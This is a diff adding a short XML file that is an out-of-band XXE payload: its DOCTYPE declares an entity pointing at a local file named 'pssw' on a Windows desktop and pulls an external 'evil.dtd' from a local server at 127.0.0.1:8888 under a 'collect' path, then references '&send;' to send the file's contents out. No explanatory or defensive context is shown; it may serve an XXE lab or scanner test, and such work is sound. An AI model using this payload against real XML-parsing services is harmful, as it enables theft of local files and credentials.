@@ -1,0 +1,13 @@
+<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
+<!DOCTYPE model [
+        <!ENTITY % file SYSTEM
+                "C:\Users\Gleb\Desktop\pssw">
+        <!ENTITY % dtd SYSTEM
+                "http://127.0.0.1:8888/collect/dtd/evil.dtd">
+        %dtd;
+        ]>
+<model>
+    <id>11</id>
+    <data>DATA</data>
+    <type>&send;</type>
+</model>
